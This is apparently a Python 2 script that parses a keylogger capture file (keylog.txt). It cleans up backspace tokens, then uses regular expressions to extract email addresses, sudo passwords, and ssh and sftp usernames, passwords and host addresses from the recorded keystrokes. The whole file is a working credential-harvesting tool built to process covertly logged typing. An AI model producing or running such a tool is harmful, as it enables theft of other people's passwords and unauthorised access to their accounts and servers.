import re

def printmails(file):
    regex_mail = re.compile(r"(\w+)@(\w+\.[a-zA-Z]{2,4})(\.[uk]{2})?")    
    print "******** MAILS **********"
    for m in regex_mail.finditer(file):
        g = m.groups()
        if g[2] == None:
                print "%s@%s" % (g[0], g[1])
        else:
                print "%s@%s%s" % g
    print "*************************"

def remove_use_backspace(file):
    regex_backspace = re.compile(r"(\w+)({BACKSPACE})")
    regz = regex_backspace.search(file)
    while regz:
        #print regex_backspace.search(file).group(0)
        #print regex_backspace.search(file).group(1)
        #print regex_backspace.search(file).group(2)
        start= file.index(regex_backspace.search(file).group(2))-1
        end=  file.index(regex_backspace.search(file).group(2))+11
        file = file[:start]+file[end:]
        regz = regex_backspace.search(file)
        
    return file

def remove_useless_backspace(file):
    regex_backspace = re.compile(r"({BACKSPACE})")
    print "******** MAILS **********"
    regz = regex_backspace.search(file)
    while regz:
        start= file.index(regex_backspace.search(file).group(1))
        end=  file.index(regex_backspace.search(file).group(1))+11
        file = file[:start]+file[end:]
        regz = regex_backspace.search(file)
        
    return file

def remove_backspace(file):
    file = remove_use_backspace(file)
    file = remove_useless_backspace(file)        
    return file
    
def find_sudo_pass(file):
    regex_sudo = re.compile(r"(sudo [\-\w]+){ENTER}(\w+){ENTER}")
    print "******** SUDO **********"
    for sudo in regex_sudo.finditer(file):
        g = sudo.groups()
        print "cmd =",g[0]
        print "passwd =",g[1]
    print "*************************"
    
    
def find_ssh_pass(file):
    regex_ssh = re.compile(r"ssh ([\-\w]+):([\-\.\w]+)@([\-\.\:\w]+){ENTER}")
    print "********* SSH **********"
    for ssh in regex_ssh.finditer(file):
        g = ssh.groups()
        print "login =",g[0]
        print "passwd =",g[1]
        print "ip =",g[2]
    print "*************************"
    
def find_sftp_pass(file):
    regex_sftp = re.compile(r"sftp ([\-\w]+)@([\-\.\:\w]+){ENTER}([\-\.\:\w]+){ENTER}")
    print "******** SFTP **********"
    for sftp in regex_sftp.finditer(file):
        g = sftp.groups()
        print "login =",g[0]
        print "passwd =",g[2]
        print "ip =",g[1]
    print "*************************"
    
if __name__ == "__main__":
    
    file = open('C:\\Users\\Xnl\\Documents\\keylog.txt', 'r').read()   
    file = remove_backspace(file)
    print file
    printmails(file)
    find_sudo_pass(file)
    find_ssh_pass(file)
    find_sftp_pass(file)
